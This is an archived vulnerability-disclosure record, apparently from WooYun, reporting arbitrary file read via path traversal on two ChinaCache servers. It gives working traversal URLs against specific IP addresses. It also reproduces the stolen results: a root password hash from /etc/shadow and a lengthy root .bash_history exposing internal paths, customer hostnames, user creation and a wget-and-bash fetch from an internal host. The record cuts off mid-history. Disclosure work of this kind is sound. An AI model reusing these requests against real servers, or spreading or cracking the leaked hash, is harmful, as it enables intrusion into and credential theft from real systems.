{"id": 31081, "wybug_id": "wooyun-2015-0110640", "wybug_title": "ChinaCache某两台服务器任意文件读取", "wybug_corp": "ChinaCache", "wybug_author": "路人甲", "wybug_date": "2015-04-27 14:00", "wybug_open_date": "2015-06-11 14:22", "wybug_type": "重要敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["默认配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向公众公开  简要描述： 任意文件读取 详细说明：  需要使用一些请求工具，直接浏览器访问不可以http://42.62.25.197/../../../../../../../../../../../../../../../../../etc/hostshttp://42.62.25.196/../../../../../../../../../../../../../../../../../etc/hosts\n\nroot权限：http://42.62.25.197/../../../../../../../../../../../../../../../../../etc/shadow\nroot:$1$WdIfTFIg$2ZvTRs6FKd7c8lZU0g5Bt/:16341:0:99999:7:::bin:*:16315:0:99999:7:::daemon:*:16315:0:99999:7:::adm:*:16315:0:99999:7:::lp:*:16315:0:99999:7:::sync:*:16315:0:99999:7:::shutdown:*:16315:0:99999:7:::halt:*:16315:0:99999:7:::mail:*:16315:0:99999:7:::news:*:16315:0:99999:7:::uucp:*:16315:0:99999:7:::operator:*:16315:0:99999:7:::games:*:16315:0:99999:7:::gopher:*:16315:0:99999:7:::ftp:*:16315:0:99999:7:::nobody:*:16315:0:99999:7:::nscd:!!:16315:0:99999:7:::ais:!!:16315:0:99999:7:::distcache:!!:16315:0:99999:7:::vcsa:!!:16315:0:99999:7:::ntp:!!:16315:0:99999:7:::mysql:!!:16315:0:99999:7:::pcap:!!:16315:0:99999:7:::dbus:!!:16315:0:99999:7:::cimsrvr:!!:16315:0:99999:7:::hsqldb:!!:16315:0:99999:7:::oprofile:!!:16315:0:99999:7:::squid:!!:16315:0:99999:7:::haldaemon:!!:16315:0:99999:7:::avahi:!!:16315:0:99999:7:::apache:!!:16315:0:99999:7:::mailnull:!!:16315:0:99999:7:::smmsp:!!:16315:0:99999:7:::xfs:!!:16315:0:99999:7:::rpc:!!:16315:0:99999:7:::named:!!:16315:0:99999:7:::postgres:!!:16315:0:99999:7:::piranha:!!:16315:0:99999:7:::sshd:!!:16315:0:99999:7:::gdm:!!:16315:0:99999:7:::webalizer:!!:16315:0:99999:7:::dovecot:!!:16315:0:99999:7:::luci:!!:16315:0:99999:7:::tomcat:!!:16315:0:99999:7:::rpcuser:!!:16315:0:99999:7:::nfsnobody:!!:16315:0:99999:7:::avahi-autoipd:!!:16315:0:99999:7:::sabayon:!!:16315:0:99999:7:::qemu:!!:16315:0:99999:7:::ricci:!!:16315:0:99999:7:::puppet:!!:16426::::::sonar:!!:16471::::::\n可以查看.bash_historyhttp://42.62.25.196/../../../../../../../../../../../../../../../../../root/.bash_history\ncd /usr/local/nginx/conf/#1414028560ls#1414028563cat nginx.conf#1414028574vim nginx.conf#1414028598ls#1414028601vim nginx.conf#1414028670/etc/init.d/nginx.sh restart#1414028676netstat -ltunp#1414028708ls#1414028771ls#1414028774ls#1414028777cat nginx.conf#1414028997ls#1414029009cd /data/cache1#1414029010ls#1414029022cd hls3.gzstv.com/#1414029023ls#1414030010cd /data/cache1#1414030011ls#1414030014cd hls3.gzstv.com/#1414030014LS#1414030016LS#1414030018ls#1414030021cd live#1414030021ls#1414030023cd cc#1414030024ls#1414030028ls -trl#1414030034ls -trl#1414030035ls -trl#1414030036ls -trl#1414030037ls -trl#1414030038ls -trl#1414030039ls -trl#1414030040ls -trl#1414030041ls -trl#1414030041ls -trl#1414030042ls -trl#1414030046ls -trl#1414030047ls -trl#1414030052ls -trl#1414030054ls -trl#1414030055ls -trl#1414030056ls -trl#1414030056ls -trl#1414030058ls -trl#1414030072ls -trl#1414030073ls -trl#1414030074ls -trl#1414034752netstat -ltunp#1414046455netstat -ntlp#1414046462vim /usr/local/ccms/origin/etc/ccms_origin.conf#1414042554ifconfig#1414042587cd /usr/local/ccms/origin/etc/#1414042588ls#1414042591cat ccms_edge.conf #1414042604ls#1414042608cat ccms_origin.conf#1414044732netstat -ltunp#1414044880netstat -ltunp#1414044884ifconfig#1414119785cd /usr/local/ccms/origin#1414119785ls#1414119787cd logs#1414119788ls#1414119805tail -f 20141021090639-Orginlog.log#1414120950cat 20141021090639-Orginlog.log | grep -a tcUrl=rtmp://pull.showself.com/#1414120998cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/#1414121330cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"10\") print $2}'#1414121347cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print $2}'#1414121398cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print $6}'#1414121427cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print $6}'#1414121429cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/#1414121528cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print}' #1414121615cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print}' #1414121683cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print NF}' #1414121808cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print $5}' #1414121838cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print $7}' #1414121858cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print $NF}#1414121878cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print}' #1414121952cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") if($NF==\"stream_name*\") print $NF}' #1414121961cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") if($NF=='stream_name*') print $NF}' #1414121981cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print $NF}' #1414122013cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print $NF}' | grep \"stream*\" #1414122188cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print $NF}' | grep \"stream*\" #1414122203cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print $NF}' | grep \"stream*\" #1414122215cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print $NF}' | grep \"stream*\" #1414122220cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-24\") print $NF}' | grep \"stream*\" #1414119244ls#1414119303cd /usr/local/ccms/origin#1414119309ls#1414119312cat etc#1414119313ls#1414119325cat ccms-origin #1414119334cd etc#1414119334ls#1414119339cat ccms_origin.conf#1414119355ls#1414119358cd ..#1414119359ls#1414119362cd logs#1414119363ls#1414119378tail -f 20141021090639-Orginlog.log#1414119384ls#1414119407find / -name \"log\"#1414119431find / -name \"logs\"#1414119466pwd#1414119469ls#1414119472ls -trl#1414119488tail -f 20141021090639-Orginlog.log#1414119713ls #1414120139cd /usr/local/ccms/origin/#1414120140ls#1414120141cd logs#1414120141ls#1414120146ls -hlr#1414120148ls#1414120170cat 20141021090639-Orginlog.log | grep tcUrl=rtmp://pull.showself.com/#1414123647ls#1414123660cd /usr/lcoal/ccms#1414123665cd /usr/lcoal/ccms#1414123678cd /usr/local/ccms/origin/etc#1414123679ls#1414123684cat ccms_origin.conf#1414123696cd data#1414123698cd data#1414123703cd /#1414123703ls#1414123707cd data#1414123707ls#1414123711cd cache1#1414123712ls#1414123728lll#1414123729l#1414123731ll#1414123883cd /usr/local/ccms/origin#1414123883ls#1414123885cd etc#1414123886ls#1414123891vim ccms_origin.conf#1414123917/etc/init.d/ccms-origin reload#1414124073vim ccms_origin.conf#1414124093/etc/init.d/ccms-origin reload#1414124140ls#1414124143netstat -ltunp#1414373093cd /usr/local/ccms/origin#1414373094ls#1414373095cd logs#1414373096ls#1414373207cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://live3.gzstv.com | awk 'BEGIN{FS=\" \"} {if($1==\"[10-27\") print $NF}' | grep \"stream*\"  #1414373216cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://live3.gzstv.com | awk 'BEGIN{FS=\" \"} { print $NF}' | grep \"stream*\"  #1414373226cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://live3.gzstv.com#1414373229ll#1414373237ls -h#1414373239ls -hl#1414373261cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://live3*#1414373462cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://live3.*#1414373483head 10 20141021090639-Orginlog.log#1414374216cd /usr/local/ccms/origin#1414374217ls#1414374219cd logs#1414374220ls#1414374222ll -hltr#1414374281cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://live3.gzstv.com | awk 'BEGIN{FS=\" \"} {if($1==\"[10-27\") print $NF}' | grep \"stream*\"  #1414374295tail -f 20141021090639-Orginlog.log#1414374639cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://wmup.ccgslb.com.cn | awk 'BEGIN{FS=\" \"} {if($1==\"[10-27\") print $NF}' | grep \"stream*\"  #1414374650cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://wmup.ccgslb.com.cn* | awk 'BEGIN{FS=\" \"} {if($1==\"[10-27\") print $NF}' | grep \"stream*\"  #1414374654ll#1414374770cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://wmup.ccgslb.com.cn #1414374792cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://wmdown.ccgslb.com.cn | awk 'BEGIN{FS=\" \"} {if($1==\"[10-27\") print $NF}' | grep \"stream*\"  #1414374819cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://wmdown.ccgslb.com.cn | awk 'BEGIN{FS=\" \"} {if($1==\"[10-27\") print $NF}' | grep \"stream*\"  #1414374840cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://wmdown.ccgslb.com.cn | awk 'BEGIN{FS=\" \"} {if($1==\"[10-27\") print $NF}' | grep \"stream*\"  #1414374843cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://wmdown.ccgslb.com.cn | awk 'BEGIN{FS=\" \"} {if($1==\"[10-27\") print $NF}' | grep \"stream*\"  #1414374844cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://wmdown.ccgslb.com.cn | awk 'BEGIN{FS=\" \"} {if($1==\"[10-27\") print $NF}' | grep \"stream*\"  #1414375183cd /usr/local/ccms/origin#1414375183ls#1414375185cd logs#1414375185ls#1414375197tail -f 20141021090639-Orginlog.log#1414375341tail -f 20141021090639-Orginlog.log#1414375485ll#1414375489cat 20141021090639-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-27\") print $NF}' | grep \"stream*\"  #1414378123ls#1414378132vim /usr/local/ccms/origin/etc/ccms_origin.conf#1414378325cat  /usr/local/ccms/origin/etc/ccms_origin.conf | grep vhost#1414378339cat  /usr/local/ccms/origin/etc/ccms_origin.conf | grep vhost | awk '{print $2}'#1414378349cat  /usr/local/ccms/origin/etc/ccms_origin.conf | grep vhost | awk '{print $2}'#1414385102/etc/init.d/ccms-origin reload#1414385152cd /usr/local/ccms/origin#1414385153ls#1414385158cd ccms-origin #1414385161cd etc#1414385162ls#1414385170cat ccms_origin.conf#1414385188vim ccms_origin.conf#1414385224/etc/init.d/ccms-origin reload#1414385697cat /usr/local/ccms/origin/etc#1414385702cat /usr/local/ccms/origin/etc/ccms_origin.conf#1414396638cd /usr/local/ccms/origin#1414396638ls#1414396640cd et#1414396643cd etc#1414396645ls#1414396649cat ccms_origin.conf#1414396661vim ccms_origin.conf#1414396711/etc/init.d/ccms-origin reload#1414396719vim ccms_origin.conf#1414396723ls#1414406704cd /data/cache1#1414406705ls#1414406708cd hls3.gzstv.com/#1414406708ls#1414406710cd txh#1414406711ls#1414406712cd cc#1414406712ls#1414406713ls#1414406714ls#1414406724ls#1414406726ls#1414401342vim /usr/local/ccms/origin/etc/ccms_origin.conf#1414401415netstat -lntp#1414401481vim /usr/local/ccms/origin/etc/ccms_origin.conf#1414401534netstat -lntp#1414401530netstat -ltunp#1414401543cd /usr/local/nginx/#1414401543ls#1414401550cd conf#1414401551ls#1414401554cat nginx.conf#1414401689vim nginx.conf#1414401711/etc/init.d/nginx.sh reload#1414402469netstat -ltunp#1414402717cd /usr/local/ccms/origin#1414402718ls#1414402719cd etc#1414402720ls#1414402723cat ccms_origin.conf#1414402740ifconfig#1414404517cd /usr/local/ccms/origin#1414404518ls#1414404519cd etc#1414404520ls#1414404525cat ccms_origin.conf#1414404553cat /usr/local/nginx/conf/nginx.conf#1414404792vim /usr/local/nginx/conf/nginx.conf#1414404813/etc/init.d/nginx.sh reload#1414404828cd /usr/local/ccms/origin#1414404829ls#1414404831cd etc#1414404832ls#1414404842ls#1414404846cat ccms_origin.conf#1414404864netstat -ltunp#1414405014lsnetstat -ltunp#1414405016netstat -ltunp#1414405197ls#1414405198cd ..#1414405199ls#1414405202cd /data/#1414405203ls#1414405208cd cache1#1414405208ls#1414405213cd hls3.gzstv.com/#1414405214ls#1414405216cd txh#1414405217ls#1414405219cd cc#1414405220ls#1414405223ls -ltr#1414405255ls#1414405257ls #1414405337ls#1414405338ls#1414405340cd ..#1414405340ls#1414405345netstat -ltunp#1414405450ls#1414405465cat /usr/local/nginx/conf/nginx.conf#1414405482/etc/init.d/nginx.sh restart#1414405490netstat -ltunp#1414405682ls#1414405684cd cc#1414405685ls#1414405688cd txh1#1414405689ls#1414405691cd ..#1414405692ls#1414405694cd txh1/#1414405695ls#1414405695ls#1414405712ls#1414405713cd ..#1414405714ls#1414405716cd cc#1414405717ls#1414405930netstat -ltunp#1414405940ls#1414405944ls#1414405945cd ..#1414405945ls#1414405946pwd#1414405949cd txh#1414405949ls#1414405952ls#1414405953cd cc#1414405953ls#1414405954pwd#1414405978cat /usr/local/nginx/etc#1414405987cat /usr/local/nginx/conf/nginx.conf#1414405999cd /data/cache1#1414406000ls#1414406004cd hls3.gzstv.com/#1414406004ls#1414406007cd ..#1414406009ll#1414406029chmod 777 hls3.gzstv.com/#1414406032chmod 777 hls3.gzstv.com/#1414406033ls#1414406035ll#1414406038cd hls#1414406041cd hls3.gzstv.com/#1414406041ls#1414406045cd txh#1414406045ls#1414406047cd cc#1414406047ls#1414406048ls#1414406048ls#1414406049ls#1414406293ls#1414406294ls#1414406296cd ..#1414406297ls#1414406298cd txh1#1414406299ls#1414406299ls#1414406301cd ..#1414406301ls#1414406302ls#1414406303cd cc#1414406303ls#1414406304sls#1414406305ls#1414405822netstat -lntp#1414405830vim /usr/local/ccms/origin/etc/ccms_origin.conf#1414406019cd /data/cache1#1414406020ls#1414406026cd hls3.gzstv.com/#1414406027ls#1414406030cd txh/#1414406030ls#1414406032cd cc/#1414406032ls#1414406048vim /usr/local/ccms/origin/etc/ccms_origin.conf#1414406201vim /usr/local/ccms/origin/etc/ccms_origin.conf#1414406212/etc/init.d/ccms-origin reload#1414406221netstat -lntp#1414406223ls#1414406227cat index.m3u8.list #1414406227ls#1414406229ls#1414406230cat index.m3u8.list #1414406231cat index.m3u8.list #1414406231cat index.m3u8.list #1414406232cat index.m3u8.list #1414406233cd ..#1414406233ls#1414406235cd txh1/#1414406236ls#1414406237cd ..#1414406238ls#1414406241cd ..#1414406241ls#1414406243cd ..#1414406244ls#1414406253vim /usr/local/ccms/origin/etc/ccms_origin.conf#1414406356netstat -lntp#1414406360vim /usr/local/ccms/origin/etc/ccms_origin.conf#1414406375netstat -lntp#1414406402vim /usr/local/nginx/conf/nginx.conf#1414406445cd#1414406445ls#1414406448cd /data/cache1#1414406448ls#1414406452cd hls3.gzstv.com/#1414406453ls#1414406455cd txh/#1414406455ls#1414406456cd cc/#1414406457ls#1414406469cd ..#1414406470ls#1414406471cd ..#1414406471ls#1414406473cd ..#1414406474ls#1414406477cd hls3.gzstv.com/#1414406478ls#1414406487cd txh/#1414406488ls#1414406489cd cc/#1414406490ls#1414406496/etc/init.d/ccms-origin restart#1414406500netstat -lntp#1414406529netstat -lntp#1414406536ls#1414406538ls#1414406539ls#1414406539ls#1414406540ls#1414406541cd ..#1414406541ls#1414406542ls#1414406542ls#1414406543ls#1414406544cd cc/#1414406544ls#1414406547cat index.m3u8.list #1414406549cat index.m3u8.list #1414406549cat index.m3u8.list #1414406550cat index.m3u8.list #1414406550cat index.m3u8.list #1414406550cat index.m3u8.list #1414406551cat index.m3u8.list #1414406551cat index.m3u8.list #1414406551cat index.m3u8.list #1414406552cat index.m3u8.list #1414406552cat index.m3u8.list #1414406552cat index.m3u8.list #1414406553cat index.m3u8.list #1414406553cat index.m3u8.list #1414406553cat index.m3u8.list #1414406554cat index.m3u8.list #1414406554cat index.m3u8.list #1414406555cat index.m3u8.list #1414406555cat index.m3u8.list #1414406555cat index.m3u8.list #1414406555cat index.m3u8.list #1414406555cat index.m3u8.list #1414406556cat index.m3u8.list #1414406556cat index.m3u8.list #1414406557cat index.m3u8.list #1414406558cd ..#1414406559ls#1414406560cd ..#1414406560ls#1414406582vim /usr/local/ccms/origin/etc/ccms_origin.conf#1414406607/etc/init.d/ccms-origin reload#1414406615netstat -lntp#1414406617ls#1414406618ls#1414406618ls#1414406619cd txh/#1414406619ls#1414406622cd cc/#1414406622ls#1414406623ls#1414406623ls#1414406625cat index.m3u8.list #1414406626cat index.m3u8.list #1414406627cat index.m3u8.list #1414406627cat index.m3u8.list #1414406627cat index.m3u8.list #1414406627cat index.m3u8.list #1414406627cat index.m3u8.list #1414406628cat index.m3u8.list #1414406628cat index.m3u8.list #1414406628cat index.m3u8.list #1414406629cat index.m3u8.list #1414464057cd /usr/local/ccms/origin#1414464057ls#1414464059cd logs#1414464060ls#1414464085tail -f 20141027184137-Orginlog.log#1414464998cd /usr/local/ccms/origin#1414464998ls#1414465000cd logs#1414465000l#1414465001ls#1414465099cat 20141027184137-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/ | awk 'BEGIN{FS=\" \"} {if($1==\"[10-28\") print $NF}' | grep \"stream*\"  #1414465120cat 20141027184137-Orginlog.log | grep -A5 tcUrl=rtmp://pull.showself.com/#1414465339ls#1414546862cd /usr/local/ccms/origin/etc#1414546863ls#1414546866cat ccms_origin.conf#1414557734cat /etc/hosts#1414557772ifconfig#1414579625cd /usr/local/ccms/origin/etc#1414579627cd ..#1414579628ls#1414579630cd logs#1414579630ls#1414579633ls -ltr#1414579642tail -f 20141027184137-Orginlog.log#1414652221netstat -lntp#1414652221w#1415157371netstat -lntp#1415157376cd /usr/local/cm#1415157381cd /usr/local/ccms#1415157381ls#1415157383cd origin#1415157383ls#1415157385cd etc/#1415157385ls#1415157388vim ccms_origin.conf#1415157400/etc/init.d/ccms-origin version#1415157409vim ccms_origin.conf#1415157454/etc/init.d/ccms-origin reload#1415157482cd ..#1415157482ls#1415157483cd logs/#1415157484ls#1415157485ls#1415157487ll#1415157493cat  20141104160906-Orginlog.log | grep test#1417575447cat /sn.txt #1417575457netstat -ntlp#1417575460df -h#1417575462netstat -tnlp#1417575498vim /usr/local/ccms/origin/etc/ccms_origin.conf#1417575509ls#1417575511netstat -tnlp#1419399421vim /usr/local/ccms/origin/etc/ccms_origin.conf#1426736414ls#1426736417rm  -f ccms_origin_update.sh && wget http://58.68.234.194:800/rdb/ccms/test/ccms_origin_update.sh && bash ccms_origin_update.sh#1426736475yum -y install libmysqlclient.so.16#1426736548netstat -lntp#1426736565vim /usr/local/ccms/origin/etc/ccms_origin.conf#1426736585vim /usr/local/ccms/origin/etc/ccms_origin.conf#1426736605vim /usr/local/ccms/origin/etc/ccms_origin.conf#1426736678vim /usr/local/ccms/origin/etc/ccms_origin.conf#1426736758/etc/init.d/ccms-origin restart#1426736761netstat -lntp#1426736774vim /usr/local/nginx/conf/nginx.conf#1426736790cd /data/cache3#1426736791ls#1426736796mkdir                listen  80 ;#1426736796                server_name hls3.gzstv.com;#1426736796                root   /data/cache1/hls3.gzstv.com ;#1426736810vim /usr/local/ccms/origin/etc/ccms_origin.conf#1426736824mkdir t.59find.com#1426736829df -h#1426736833ls#1426736838mkdir t.59find.com#1426736843cd /data/cache1#1426736843ls#1426736845mkdir t.59find.com#1426736855vim /usr/local/ccms/origin/etc/ccms_origin.conf#1426736875/etc/init.d/ccms-origin restart#1426735138netstat -lntp#1426735146vim /usr/local/ccms/origin/etc/ccms_origin.conf#1426735166/etc/init.d/ccms-origin version#1426737366ifconfig#1426737385/etc/init.d/ccms-origin version#1426737436ls#1426737443cd ccms-origin-1.3.4.5-centos-5-Linux-2.6.18-x86_64#1426737443ls#1426737465cd /etc/init.d/#1426737466ls#1426737472./ccms-origin version#1426737473./ccms-origin version#1426737474./ccms-origin version#1426737474./ccms-origin version#1426737475cd#1426737483rm ccms_origin_update.sh && wget http://58.68.234.194:800/rdb/ccms/test/ccms_origin_update.sh && bash ccms_origin_update.sh#1426737526/etc/init.d/ccms-origin version#1426737545ls#1426737563cd ccms-origin-1.3.4.5-centos-5-Linux-2.6.18-x86_64#1426737564ls#1426737572./origin_install.sh #1426737601./origin_install_manual.sh #1426737766cd /usr/local/ccms/origin#1426737766ls#1426737779cd /usr/local/ccms#1426737780ls#1426737794ll#1426737827ls#1426737835rm  -f  origin#1426737836ls#1426737853cd #1426737853ls#1426737860cd ccms-origin-1.3.4.5-centos-5-Linux-2.6.18-x86_64#1426737861ls#1426737872./origin_install_manual.sh #1426737895ls#1426738090cd  /usr/local/ccms/#1426738091ls#1426738100cd origin.1426736431#1426738100ls#1426738103cd etc/#1426738103ls#1426738107vim ccms_origin.conf#1426738157mv /usr/local/ccms/origin/etc/ccms_origin.conf /usr/local/ccms/origin/etc/ccms_origin.conf.bak#1426738173cp ./ccms_origin.conf /usr/local/ccms/origin/etc/ccms_origin.conf#1426738183cd /usr/local/ccms/origin/etc#1426738183ls#1426738186vim ccms_origin.conf#1426738191/etc/init.d/ccms-origin restart#1426738202yum -y install  libmysqlclient.so.16#1426738212/etc/init.d/ccms-origin version#1426738265netstat -lntp#1426738270/etc/init.d/ccms-origin version#1426738285netsta -lntp#1426738291netstat -lntp#1426738309vim /etc/init.d/ccms-origin #1426738337/etc/init.d/ccms-origin restat#1426738340/etc/init.d/ccms-origin restart#1426738399cd#1426738399ls#1426738403cd ccms-origin-1.3.4.5-centos-5-Linux-2.6.18-x86_64#1426738404ls#1426738413./mysql_install_manual.sh #1426738428cd /usr/local/#1426738428ls#1426738432rm -rf mysql/#1426738437./mysql_install_manual.sh #1426738444cd -#1426738444ls#1426738448./mysql_install_manual.sh #1426738453cd#1426738458/etc/init.d/ccms-origin restart#1426738499rm  -f ccms_origin_update.sh && wget http://58.68.234.194:800/rdb/ccms/test/ccms_origin_update.sh && bash ccms_origin_update.sh#1426738514/etc/init.d/ccms-origin version#1426741790vim /etc/resolv.conf #1426741804rm  -f ccms_origin_update.sh && wget http://58.68.234.194:800/rdb/ccms/test/ccms_origin_update.sh && bash ccms_origin_update.sh#1426741825yum -y install libmysqlclient.so.16#1426741993ls#1426741995netstat -lntp#1426742005vim /usr/local/ccms/origin/etc/ccms_origin.conf#1426742034ifconfig#1426745034exit#1426743117crontab -e#1426743168ls -lh#1426743172cd /usr/local/ccms/origin#1426743173ls -lh#1426743174cd bin#1426743175ls -lh#1426743183ldd ccms_ori #1426743219ls -lh#1426743230./ccms_ori -v#1426743295cat /etc/issue#1426744303cd /usr/local/mysql/bin/#1426744304ls -lh#1426744306cd ..#1426744307ls -lh#1426744308cd lib#1426744309ls -lh#1426744313mysql#1426744317cd mysql/#1426744319ls -lh#1426744344cd ..#1426744345ls -lh#1426744347cd ..#1426744348ls -lh#1426744351cd ..#1426744352ls -lh#1426744358cd#1426744360ls -lh#1426744374cd ccms-origin-1.3.4.5-centos-5-Linux-2.6.18-x86_64#1426744375ls -lh#1426744380cd bin#1426744381ls -lh#1426744386ldd ccms_ori #1426744558ls -lh /usr/local/mysql/lib/mysql/libmysqlclient.so.16#1426744652cd ..#1426744707ls -lh#1426744715rm -rf /usr/local/mysql/#1426744726./mysql_install_manual.sh #1426744795cc#1426744814ps -ef|grep mysql#1426744821killall mysql#1426744828killall mysqld#1426744833ps -ef|grep mysql#1426744845ps -ef|grep mysql#1426744850ls -lh#1426744858./mysql_install_manual.sh #1426744873rm -rf /usr/local/mysql#1426744875./mysql_install_manual.sh #1426744903ps -ef|grep mysql#1426744916vi mysql_install_manual.sh #1426744928ls -lh#1426744938rm -rf /usr/local/ccms/origin#1426744943./origin_install_manual.sh #1426744952cd /usr/local/ccms/origin#1426744954ls -lh#1426744957cd bin#1426744958ls -lh#1426744964ldd ccms_ori #1426745076crontab -e#1426745142useradd -m xiaosu.lv#1426745152passwd xiaosu.lv#1426745174ifconfig|less#1426745216killall mysqld#1426745221ps -ef|grep mysql#1426745373vi /etc/profile#1426745455ls -lh#1426745463ldd ccms_ori #1426745467vi /etc/profile#1426745520vi /etc/ld.so.conf#1426745531ldconfig#1426745539ls -lh#1426745542ldd ccms_ori #1426745549cd#1426745561cd /home/xiaosu.lv/#1426745562ls -lh#1426745565tar -xzvf test.tar.gz #1426745570ls -lh#1426745571cd test#1426745573ls -lh#1426745580unzip ccms-origin-1.3.4.5-centos-5-Linux-2.6.18-x86_64.zip#1426745587ls -lh#1426745592cd ccms-origin-1.3.4.5-centos-5-Linux-2.6.18-x86_64#1426745593ls -lh#1426745594cd bin#1426745595ls -lh#1426745598ldd ccms_ori #1426745638vi /etc/ld.so.conf#1426745651ls -lh#1426745681ls -lh /usr/local/mysql/lib/mysql/libmysqlclient.so.16#1426745737vi /etc/profile#1426745748vi /etc/ld.so.conf#1426745752ls -lh#1426745769cd /etc/ld.so.conf.d/mysql-x86_64.conf#1426745772vi /etc/ld.so.conf.d/mysql-x86_64.conf#1426745801ls -lh#1426745814cd /etc/ld.so.conf.d#1426745815ls -lh#1426745822cat mysql-i386.conf#1426745831rm -rf mysql-i386.conf mysql-x86_64.conf#1426745834cd ..#1426745836ldconfig#1426745838ldconfig#1426745840ls -lh#1426745852cd /usr/local/ccms/origin/bin/#1426745853ls -lh#1426745857ldd ccms_ori #1426748136cd /etc/ld.so.conf#1426748142cd /etc/ld.so.conf.d#1426748143ls -lh#1426748152rm -rf kernelcap-2.6.18-308.el5.conf#1426748153ls -lh#1426748167vi /etc/ld.so.conf#1426748182vi /etc/profile#1426748638ps -ef|grep mysql#1426750150ps -ef|grep mysql#1426750156exit#1426746259ldconfig#1426746289vi /etc/ld.so.conf.d/kernelcap-2.6.18-308.el5.conf#1426746300cd /etc/ld.so/conf.d#1426746311cd /etc/ld.so.conf.d/#1426746312ls -lh#1426746334cat kernelcap-2.6.18-308.el5.conf#1426746342grep \"hwcap\" *#1426746355ls -lh#1426746372mv kernelcap-2.6.18-308.el5.conf kernelcap-2.6.18-308.el5.conf.bak#1426746374cd ..#1426746375ls -lh#1426746386cat ld.so.conf#1426746394ldconfig#1426746402ls -lh#1426746413cd /usr/local/ccms/origin#1426746414ls -lh#1426746415cd bin#1426746416ls lh#1426746417ls -lh#1426746422ldd ccms_ori #1426746434./ccms_ori -v#1426746650cd#1426746651ls -lh#1426746656cd ccms-origin-1.3.4.5-centos-5-Linux-2.6.18-x86_64#1426746657ls -lh#1426746664vi mysql_install_manual.sh #1426746770vi origin_install_manual.sh #1426746788vi mysql_install_manual.sh #1426746864cd /etc/ld.so.conf.d/#1426746866ls -l#1426746877cp kernelcap-2.6.18-308.el5.conf.bak kernelcap-2.6.18-308.el5.conf#1426746883ldconfig#1426746890cd ..#1426746891ls -lh#1426746893cd #1426746896ls -lh#1426746903rm -rf /usr/local/mysql/#1426746909cd ccms-origin-1.3.1.2-centos-5-Linux-2.6.18-x86_64#1426746911ls -lh#1426746920cd 